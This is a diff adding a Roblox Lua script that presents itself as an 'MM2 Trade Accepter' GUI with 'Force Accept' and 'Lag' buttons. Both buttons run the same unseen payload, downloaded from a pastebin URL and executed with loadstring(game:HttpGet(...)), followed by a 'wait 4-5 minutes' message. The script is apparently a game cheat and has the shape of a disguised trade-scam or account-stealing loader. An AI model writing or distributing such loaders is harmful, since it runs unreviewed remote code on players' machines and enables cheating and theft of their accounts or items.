@@ -1,0 +1,58 @@
+-- Load the Orion Library
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+-- Create a Window
+local Window = OrionLib:MakeWindow({Name = "MM2 Trade Accepter", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+-- Create Tabs
+local MainTab = Window:MakeTab({
+Name = "Main",
+Icon = "rbxassetid://4483345998",
+PremiumOnly = false
+})
+
+local Section = MainTab:AddSection({
+Name = "Actions"
+})
+
+-- Function to load and execute script
+local function loadAndExecuteScript()
+local success, response = pcall(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/sRg5b9Hd"))()
+end)
+
+if success then
+OrionLib:MakeNotification({
+Name = "Success",
+Content = "Script executed successfully. Wait 4-5 minutes to make it work fully.",
+Image = "rbxassetid://4483345998",
+Time = 8
+})
+else
+OrionLib:MakeNotification({
+Name = "Error",
+Content = "Failed to execute script: " .. response,
+Image = "rbxassetid://4483345998",
+Time = 5
+})
+end
+end
+
+-- Button for Force Accept
+MainTab:AddButton({
+Name = "Force Accept",
+Callback = function()
+loadAndExecuteScript()
+end
+})
+
+-- Button for Lag
+MainTab:AddButton({
+Name = "Lag",
+Callback = function()
+loadAndExecuteScript()
+end
+})
+
+-- Initialize the GUI
+OrionLib:Init()
